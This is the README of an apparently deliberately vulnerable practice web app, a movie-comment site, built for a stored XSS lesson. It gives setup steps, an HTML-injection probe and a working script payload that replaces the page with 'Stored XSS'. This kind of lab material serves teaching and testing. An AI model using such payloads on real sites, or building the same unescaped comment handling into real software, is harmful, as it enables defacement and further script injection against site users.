# <center>PRESENTING MY LATHP LEGACY - 3 XSS (Cross Site Scripting)</center>
## What is this website do ?
* This website is for obtaining audience public opinion, about recently released(2025) Movies.
## RECOMMENDED WAY TO CLONE
* `git clone https://github.com/KuberaKrishna/LAHTP-LEGACY-3.git XSS` || if you are not using the default 'XSS', have to replace 'XSS' to 'Your filename' in _libs/load.php line 11.
## Read this before executing in Linux
* Move the configuration folder to /var/www/ (Due to file permissions).
* Works perfectly in Mac and Windows.
## SETTING UP DATABASE ENVIRONMENT
* To create user in adminer, use sql/adminer-user.sql
* To create DB in adminer, use sql/adminer-sql.sql
* To create user in phpmyadmin, use sql/phpmyadminuser.sql
* To create DB in phpmyadmin, use sql/phpmyadmin-sql.sql
## STORED XSS
### Information Gathering
* To check whether XSS is possible, script in commentSection Enter your opinion about this movie here! = `<p style=color:red;>Hello World</p>`, if this code executes as an HTML, there is probably an XSS vulnerability.
### Attacking 
* To exploit the vulnerability, script in commentSection = `<script>document.documentElement.innerHTML="<h1 style=font-family:sans-serif;height:100vh;display:flex;align-items:center;justify-content:center>Stored XSS</h1>"</script>`, this JS payload will remove all the content of the website and display 'Stored XSS'.
